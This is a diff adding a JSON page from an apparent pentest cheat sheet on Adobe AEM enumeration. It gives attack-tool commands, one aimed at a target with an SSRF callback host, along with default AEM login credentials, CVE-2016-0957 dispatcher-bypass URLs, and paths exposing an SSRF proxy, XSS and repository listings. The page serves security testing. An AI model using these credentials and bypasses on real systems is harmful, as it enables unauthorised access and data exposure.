@@ -1,0 +1,95 @@
+{
+    "title": "Adobe AEM",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Technologies",
+            "url": "/enumeration/webservices"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Tools",
+            "type": "code_block",
+            "content": [
+                "# https://github.com/0ang3el/aem-hacker",
+                "python3 aem_discoverer.py --file list.txt",
+                "python3 aem_hacker.py -u https://target.com --host [SSRF_CALLBACK]",
+                "#https://github.com/Raz0r/aemscan"
+            ]
+        },
+        {
+            "heading": "Paths",
+            "type": "code_block",
+            "content": [
+                "#https://github.com/clarkvoss/AEM-List/blob/main/paths",
+                "#https://github.com/emadshanab/Adobe-Experience-Manager/blob/main/aem-paths.txt"
+            ]
+        },
+        {
+            "heading": "Creds",
+            "type": "code_block",
+            "content": [
+                "admin:admin",
+                "author:author",
+                "anonymous:anonymous",
+                "replication-receiver:replication-receiver",
+                "jdoe@geometrixx.info:jdoe",
+                "aparker@geometrixx.info:aparker",
+                "grios:password",
+                "vgnadmin:vgnadmin",
+                "james.devore@spambob.com:password",
+                "matt.monroe@mailinator.com:password",
+                "aaron.mcdonald@mailinator.com:password",
+                "jason.werner@dodgit.com:password)"
+            ]
+        },
+        {
+            "heading": "Vulns",
+            "subheadings": [
+                {
+                    "heading": "CVE-2016-0957 - Bypass dispatcher filters",
+                    "type": "paragraph",
+                    "content": "``bash\nhttps://aemsite/bin/querybuilder.json/a.css\nhttps://aemsite/bin/querybuilder.json/a.html\nhttps://aemsite/bin/querybuilder.json/a.ico\nhttps://aemsite/bin/querybuilder.json/a.png\nhttps://aemsite/bin/querybuilder.json;%0aa.css\nhttps://aemsite/bin/querybuilder.json/a.1.json\nhttps://aemsite///bin///querybuilder.json\nhttps://aemsite///etc.json\n#Depending on the version and configuration of the affected AEM installation, the above vulnerability could expose the Publish tier to a number of vulnerabilities, including:\n# Provides a proxy which is able to be used to perform arbitrary server-side requests.\n/libs/opensocial/proxy\n# Exposes a reflected Cross-Site Scripting (XSS) vulnerability in older versions of AEM 5.X.\n/etc/mobile/useragent-test.html\n# Exposes an unauthenticated, browsable view of all content in the repository which may lead to information disclosure.\n/etc/reports/diskusage.html\n``\n{% embed url=\"https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps\" %}\n{% embed url=\"https://www.infosecinstitute.com/resources/penetration-testing/adobe-cq-pentesting-guide-part-1/\" %}"
+                }
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2025-04-10T09:50:17.554Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/adobe-aem.md",
+        "previous_page": {
+            "title": "Tomcat",
+            "url": "/enumeration/webservices/tomcat"
+        },
+        "next_page": {
+            "title": "Magento",
+            "url": "/enumeration/webservices/magento"
+        }
+    }
+}
